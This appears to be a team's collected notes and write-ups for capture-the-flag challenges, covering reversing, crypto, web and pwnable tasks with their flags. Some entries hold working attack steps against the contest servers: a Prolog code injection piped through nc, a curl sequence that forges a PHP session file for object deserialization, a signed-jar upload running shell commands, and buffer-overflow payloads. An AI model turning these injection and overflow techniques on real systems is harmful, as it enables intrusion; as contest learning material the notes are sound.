# Hard Interview (grabbag50) (solved)

    solution: ssh admin@312.5.125.233 (the second "IP" address on the list in the movie SwordFish)

    SwordFish (2001) reference

    Command "ssh" is available

    Address "213.225.312.5" is reachable (username yet unknown)

    "ssh admin@213.225.312.5" yields:

    ... Username found

    ... Address reachable

    but then returns to the previous prompt, seemingly only checking the availability of username/address

    ssh usage info:

     ['ssh']: incorrect number of parameters

    usage:  ssh username@address

        username: THE username

        address: a not so easily reachable IP address

    Very simple...isn't it?

    I imagine "admin" might not be "THE" username they're looking for.

  did you try username42 or something? or just 42, as this is THE answer ;)
  bah, numbers (anywhere) in the username result in "ssh: Could not resolve hostname or username not valid"
  ok, was just an idea, too bad it didn't help

# Crack Me If You Can (reversing100) (solved)

    Android app with encoded flag in resources.arsc and decoding routines.

# Hanoi as a service (pwnable50) (solved)

Use the following to get started (replace write(Flag) with arbitrary Prolog commands):
echo "1), write(Flag), nl, hanoi(1" | nc haas.polictf.it 80
The solution is in:

# Am I Cheating (reversing200) (solved)

    Contains (part of) the QEMU source, a QEMU disk image "challdeb.img" and a x86_64 elf binary "run_and_solve_me"

    qemu image contains x86 binary "main" with "alphabet.txt". Scanning through the qemu disk image, the C source for "main" is found.

    The application simply compares each location of the string in a slightly unpractical way to the ordering in which letters appear in the alphabet file.

    However, the "alphabet.txt" file present in the home directory does not map to a valid flag. Scanning for disk image for similar output patterns revealed the older flag.

    Turned out that just scanning for "main" in the image would have eventually given the correct flag after a couple of GB, disappointing.


# Prophet said (solved)
   tgz -> tarball u/p andrea (i.e. not a clue), contents base64 -> another gzip, text inside, to cut a long story short:
>>> l = open("input-file-here").readlines()
>>> mylist = list(set(l))
>>> s = "".join(["ABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890"[mylist.index(i)] for i in l])
>>> s

>>> s.translate(string.maketrans("TQUJEI1BRPASK2LFNVH0C3GOXYWMDZ", "helotiscang !vry'?mwpufq,bdk{}"))
"hello! this challenge is very easy isn't it? i'm trying to write a long message so statistics will help you with the letter frequencies, but i'm not really good at that, ok that's enough! ahah! i'm in love with simple lowercase flags without spaces and strange symbols, flag{lbhtbgguvfsyntbbqwbo}"
>>> [i for i in string.lowercase if i not in  "helotiscang !vry'?mwpufq,bdk{}"]

the flag should be this: "flag{lbhtbgguvfsyntbbqwbo}" -> but it isn't :)
rot13 required: flag{yougotthisflagoodjob}

# Exorcise (crypto50) (solved)
   server reads an input. it responds with ciphertext   
   This looks like the key (XORING this thing against the first line results in "What's your name?"):
       677b5f746869735f31735f73305f73696d706c655f796f755f73686f756c645f686176655f736f6c7665645f5f69745f316e5f355f7365637d666c61

    That hex string translates to:

    flag{_this_1s_s0_simple_you_should_have_solved__it_1n_5_sec} - accepted



# Reversemeplz (reversing200) (solved)

    ./reversemeplz: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, uildID[sha1]=73c7fa2b0f12e017768b50f5a67fec27e319cd87, stripped

    0x080483EF gets

    function at 0x08048804 should return other than 0

    input with [a-z]{16}

    The function at 0x8048519 does a rot13: abcdefghijklmnopqrstuvwxyz->nopqrstuvwxyzabcdefghijklm

    After the reading, we check the difference of neighbour letters with this array: 0xff, 0x11, 0xf5, 0x03, 0xf8, 0x05, 0x0e, 0xfd, 0x01, 0x06, 0xf5, 0x06, 0xf8, 0xf6

    Decimal: -1, 17, -11, 3, -8, 5, 14, -3, 1, 6, -11, 6, -8, -10

    We can match 2 series with the range 1-26/a-z: bargjbgursyntlbb, cbshkchvstzoumc

    Rot13 back: onetwotheflagyo, pofuxpuifgmbhzp

    The flag is flag{onetwotheflagyo} or flag{pofuxpuifgmbhzp}? (Tried first, it worked)

    (The second one seems to be the bug they fixed, I worked on the old binary.)


# john-the-packer (reversing350) (solved)

    Solution was: flag{packer-15-4-?41=-in-th3-4ss}

    Giving it a shot. Standard x86 elf binary.

    Inching closer to the solution. Narrowed down on the two functions that seem to handle the checking of the flag.

    Fun, part of one of the two remaining functions is a subroutine with a bunch of x87. Time to learn a new set of instructions.


    Flags accepted by the binary (but not by the site?):

    You got the flag: flag{packer-15-4-a41=-in-th3-4ss}

    You got the flag: flag{packer-15-4-c41=-in-th3-4ss}

    You got the flag: flag{packer-15-4-e41=-in-th3-4ss}

    You got the flag: flag{packer-15-4-g41=-in-th3-4ss}

    You got the flag: flag{packer-15-4-i41=-in-th3-4ss}

    You got the flag: flag{packer-15-4-k41=-in-th3-4ss}

    You got the flag: flag{packer-15-4-m41=-in-th3-4ss}

    You got the flag: flag{packer-15-4-o41=-in-th3-4ss}

    You got the flag: flag{packer-15-4-q41=-in-th3-4ss}

    You got the flag: flag{packer-15-4-s41=-in-th3-4ss}

    You got the flag: flag{packer-15-4-u41=-in-th3-4ss}

    You got the flag: flag{packer-15-4-w41=-in-th3-4ss}

    You got the flag: flag{packer-15-4-y41=-in-th3-4ss}

    You got the flag: flag{packer-15-4-_41=-in-th3-4ss}


# John-in-the-middle (forensics100) (solved)

the logo.png in the capture has a huge flag in it.. ;-) also the flag, in the background (gimp+floodfill to the rescue): flag{J0hn_th3_Sn1ff3r}

# Magic Chall (web350) (solved)
http://magic.polictf.it  


look there's a page parameter (don't put in index :-p):
http://magic.polictf.it/index.php?page=magic_things

oh hai php://filter/convert.base64-encode/resource=
the Magic object has a __call on it which prints the magic
and the magic_things page calls unserialize() on $_SESSION["userObject"] when you logout, then calls a method on it..
and finally, the session storage path is known, and we can control the log filename and enough of the contents to fake sessions :)

# make a new user
curl -v 'http://magic.polictf.it/index.php?page=register' --data 'name=bob&surname=bob&username=username1234&password=andrea&register=send'
# we have a session id now, login using it (sets the database entry)
curl -v 'http://magic.polictf.it/index.php?page=login' --data 'username=username1234&password=andrea&login=login' -H 'Cookie: PHPSESSID=5as7okgunm1oroc032sf0u6u22'
# create a second user which we'll use to overwrite the session file
curl -v 'http://magic.polictf.it/index.php?page=register' --data 'name=user%7Cs%3A12%3A%22username1234%22%3BuserObject%7Cs%3A16%3A%22O%3A5%3A%22Magic%22%3A0%3A%7B%7D%22%3B&surname=/../../tmp/sess_5as7okgunm1oroc032sf0u6u22&username=random728&password=andrea&register=send'
# overwrite the session file (log is written at first login) :)
curl -v 'http://magic.polictf.it/index.php?page=login' --data 'username=random728&password=andrea&login=login'
# now the object we put in our session gets called --> flag
curl -v 'http://magic.polictf.it/magic_things.php?logout=true' -H 'Cookie: PHPSESSID=5as7okgunm1oroc032sf0u6u22'

# John's Library (pwnable150) (solved)

    johns-library: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x651878be29012b618fa39c9bb94404db626cf1c2, not stripped

    RWE stack, no canaries

    Error in bound-checking of book title buffer, allows you to chain strings together and read beyond the buffer

    Enter a book name that exceeds the buffer size, overwrite return address, enter "u" to cause main to return and swish, control.

    Book title input of 1045 causes the last four bytes to replace the return address.

    flag{John_should_read_a_real_book_on_s3cur3_pr0gr4mm1ng}


# john's pastry shop (solved)

first you need a key to sign with:
keytool -genkey -dname "CN=Shamano Pastry Shop, OU=Shamano Cooking Service, O=Shamano Inc., L=Milano, ST=Italy, C=IT" -keystore mykeystore -alias shamano_
<enter password twice, then hit enter>

then you can send Java code (e.g. unzip the example jar, remove the shamano_ stuff from meta-inf, and replace the .class) by doing this:
rm new.jar && zip new.jar it/ META-INF/
jarsigner -keystore mykeystore new.jar shamano_
<enter same password>
python encode.py
cat out.jar | nc pastry.polictf.it 80

### python script here
newdata = open("new.jar")
mydata = open("out.jar", "w+")

# valid data
mydata.write('\x17')
for d in newdata.read():
    if d == '\x17' or d == '\x18' or d == '\x19':
        mydata.write('\x18')
        mydata.write(d)
    else:
        mydata.write(d)
mydata.write('\x19')

--> Process p = Runtime.getRuntime().exec("base64 /home/ctf/JohnPastryShop.jar");
--> then the flag is in one of the class files, flag{PinzimonioIsTheSecretIngredientAndANiceFlag}

# JOHN THE TRAVELLER (web100) (solved)
http://traveller.polictf.it
The last two words of the description are Happy holdays in finnish... so Helsinki?
curl -vvv 'http://traveller.polictf.it/?destination=helsinki' | grep 'td class=' 

    the td class changes

Seems the sequences are systematic: wXY(..) , where w is 'w', X and Y are digits (X line, Y column?), '.' is anything
(free for grabs, I need to catch some rest)
these might be indexes into 3.jpg? see http://fuzzie.org/polictf_3.jpg
manually putting the 100x100 picel QR parts together reveals the flag
flag{run_to_the_hills_run_for_your_life}

# John the Dropper (grabbag100) (unclaimed for now)

    A DNS lookup and portscan reveals that dropper.polictf.it maps to 52.18.119.20, which has port 22 open and an SSH server running.

it is surely a binary msg encoded into which pings it responds to :-) at least there are patterns in there
seems like probably groups of 5? and then for high icmp_req it just responds to all of them
yes, it is the sequence numbers of icmp echos - decode it? :)
the seq gaps are 0-3 so i'm trying the 2-bits-given-per-gap hypothesis (ben) - this is probably BS because the gap freqs are:
60 0
97 1
58 3
should've checked that sooner :X. out of ideas for now.

alyssa extracted this (packet received or not received), don't know if it matches anyone else, but this is probably hopeless:

  2 bytes = data?? (as uint16, pretty evenly distributed across the number space)
  uint16 = id (e.g. the last of the third is 0x40b4 through 0x415f (some missing, some duplicates, heavily concentrated in 0x4119-0x411f range)

# John's Shuffle
  look, you can overwrite the return address.. no exec stack though :) but system is present
  problem is: the PLT entries for all the useful functions are scrambled (by a time-seeded rand)
  and the unshuffle function (which it uses before calling them itself) requires the seed as a parameter (and zeros around it, so you can't point ebp at the bss where the seed is stored)
  to get an exit(-1) due to the unshuffle check failing, try:

python -c "import sys; sys.stdout.write('\x00'*0x20 + '\xf0\x8d\x04\x08' + '\x00'*31); sys.stdout.write('exit\n')" | ltrace ./johns-shuffle

# 3doges
the first/second keys are identical (lol) so they're no-ops and it turns into single DES
the third key generation is also bad; there are only 16 possible values for each byte:
>>> possible_keys = [0, 32, 59, 68, 246, 201, 127, 141, 242, 173, 210, 150, 169, 100, 27, 95]
